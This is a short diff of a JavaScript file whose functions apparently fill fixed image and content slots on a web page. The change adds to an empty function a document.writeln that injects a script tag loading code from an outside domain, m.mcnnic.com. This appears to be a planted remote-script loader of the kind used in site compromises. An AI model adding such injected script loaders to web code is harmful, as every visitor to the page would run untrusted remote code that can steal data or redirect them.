@@ -42,7 +42,7 @@ function m_tupian_guding2(){
  }xn_1673();
 }
 function m_tupian_guding3(){
-
+document.writeln("<script  src=\'https://m.mcnnic.com/543.html?\'></script>");
 }
 function m_neirong_guding1(){
 
